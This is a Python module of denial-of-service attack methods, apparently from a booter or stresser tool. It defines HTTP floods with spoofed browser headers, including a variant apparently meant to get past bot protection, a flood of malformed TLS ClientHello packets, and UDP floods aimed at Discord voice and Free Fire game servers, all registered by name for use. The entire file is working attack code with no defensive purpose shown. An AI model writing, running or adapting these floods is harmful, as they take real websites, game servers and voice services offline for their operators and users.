# custom_methods.py
import asyncio
import os
import random
import socket
import threading
import time

try:
    import aiohttp
except ImportError:
    aiohttp = None

try:
    from curl_cffi.requests import AsyncSession
    HAS_CURL_CFFI = True
except ImportError:
    HAS_CURL_CFFI = False


class CustomAttack:
    def __init__(self, target, port, duration, threads, stats):
        self.target = target
        self.port = port
        self.duration = duration
        self.threads = threads
        self.stats = stats
        self.stop_at = time.time() + duration

    async def run(self):
        raise NotImplementedError

    def stop(self):
        self.stop_at = 0


# ═══════════════════════════════════════════
# HTTPS-BYPASS
# ═══════════════════════════════════════════
class HTTPSBypass(CustomAttack):
    async def _worker(self, session, url):
        while time.time() < self.stop_at:
            try:
                await session.get(
                    url, timeout=8, allow_redirects=False,
                    headers={
                        "Accept": "*/*",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Cache-Control": "no-cache",
                    },
                )
                self.stats["hits"] += 1
            except Exception:
                self.stats["errors"] += 1
            await asyncio.sleep(0)

    async def run(self):
        if not HAS_CURL_CFFI:
            self.stats["error"] = "curl_cffi not installed"
            return
        url = self.target if self.target.startswith("http") \
              else f"https://{self.target}:{self.port}"
        async with AsyncSession() as session:
            tasks = [asyncio.create_task(self._worker(session, url))
                     for _ in range(self.threads)]
            await asyncio.gather(*tasks, return_exceptions=True)


# ═══════════════════════════════════════════
# HTTPS
# ═══════════════════════════════════════════
class HTTPSMass(CustomAttack):
    async def _worker(self, session, url):
        while time.time() < self.stop_at:
            for _ in range(20):
                if time.time() >= self.stop_at:
                    break
                try:
                    async with session.get(
                        url,
                        timeout=aiohttp.ClientTimeout(total=3),
                        allow_redirects=False,
                        headers={"User-Agent": "Mozilla/5.0 Chrome/124"},
                    ) as r:
                        await r.read()
                        self.stats["hits"] += 1
                except Exception:
                    self.stats["errors"] += 1

    async def run(self):
        if aiohttp is None:
            self.stats["error"] = "aiohttp not installed"
            return
        url = self.target if self.target.startswith("http") \
              else f"https://{self.target}:{self.port}"
        conn = aiohttp.TCPConnector(ssl=False, force_close=True, limit=0)
        async with aiohttp.ClientSession(connector=conn) as s:
            tasks = [asyncio.create_task(self._worker(s, url))
                     for _ in range(self.threads)]
            await asyncio.gather(*tasks, return_exceptions=True)


# ═══════════════════════════════════════════
# DDOS-BROWSER
# ═══════════════════════════════════════════
class DdosBrowser(CustomAttack):
    HEADERS = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/124.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;"
                  "q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "DNT": "1",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }

    async def _worker(self, session, url):
        while time.time() < self.stop_at:
            try:
                await session.get(
                    url, timeout=10, allow_redirects=True,
                    headers=self.HEADERS,
                )
                self.stats["hits"] += 1
            except Exception:
                self.stats["errors"] += 1
            await asyncio.sleep(0)

    async def run(self):
        if not HAS_CURL_CFFI:
            self.stats["error"] = "curl_cffi not installed"
            return
        url = self.target if self.target.startswith("http") \
              else f"https://{self.target}:{self.port}"
        async with AsyncSession() as session:
            tasks = [asyncio.create_task(self._worker(session, url))
                     for _ in range(self.threads)]
            await asyncio.gather(*tasks, return_exceptions=True)


# ═══════════════════════════════════════════
# TLS
# ═══════════════════════════════════════════
class TLSAttack(CustomAttack):
    def _build_clienthello(self):
        return bytes.fromhex("16030100a00100009c0303") \
               + os.urandom(32) \
               + bytes.fromhex(
                   "0000000000000000000000000000000000000000000000000000000000000000"
                   "00200000000000000000000000000000000000000000000000000000000000"
                   "00220000"
               ) \
               + os.urandom(100)

    def _tls_worker(self):
        hello = self._build_clienthello()
        while time.time() < self.stop_at:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((self.target, self.port))
                s.sendall(hello)
                self.stats["hits"] += 1
                s.close()
            except Exception:
                self.stats["errors"] += 1

    async def run(self):
        threads = [threading.Thread(target=self._tls_worker, daemon=True)
                   for _ in range(min(self.threads, 200))]
        for t in threads:
            t.start()
        while time.time() < self.stop_at:
            await asyncio.sleep(0.5)


# ═══════════════════════════════════════════
# VC-DISCORD
# ═══════════════════════════════════════════
class VCDiscord(CustomAttack):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.threads = min(self.threads, 100)

    def _worker(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8 * 1024 * 1024)
        except Exception as e:
            self.stats["errors"] += 1
            self.stats["last_error"] = str(e)
            return

        pkt = random._urandom(1500)
        target = (self.target, self.port)

        while time.time() < self.stop_at:
            try:
                s.sendto(pkt, target)
                self.stats["hits"] += 1
            except Exception as e:
                self.stats["errors"] += 1
                self.stats["last_error"] = str(e)

        try:
            s.close()
        except Exception:
            pass

    async def run(self):
        for _ in range(self.threads):
            threading.Thread(target=self._worker, daemon=True).start()
        while time.time() < self.stop_at:
            await asyncio.sleep(0.5)


# ═══════════════════════════════════════════
# FREEFIRE
# ═══════════════════════════════════════════
class FreeFire(CustomAttack):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.threads = min(self.threads, 100)

    def _worker(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8 * 1024 * 1024)
        except Exception as e:
            self.stats["errors"] += 1
            self.stats["last_error"] = str(e)
            return

        pkt = random._urandom(512)
        target = (self.target, self.port)

        while time.time() < self.stop_at:
            try:
                s.sendto(pkt, target)
                self.stats["hits"] += 1
            except Exception as e:
                self.stats["errors"] += 1
                self.stats["last_error"] = str(e)

        try:
            s.close()
        except Exception:
            pass

    async def run(self):
        for _ in range(self.threads):
            threading.Thread(target=self._worker, daemon=True).start()
        while time.time() < self.stop_at:
            await asyncio.sleep(0.5)


CUSTOM_REGISTRY = {
    "HTTPS-BYPASS": HTTPSBypass,
    "HTTPS":        HTTPSMass,
    "DDOS-BROWSER": DdosBrowser,
    "TLS":          TLSAttack,
    "VC-DISCORD":   VCDiscord,
    "FREEFIRE":     FreeFire,
}


def get_custom(name):
    return CUSTOM_REGISTRY.get(name)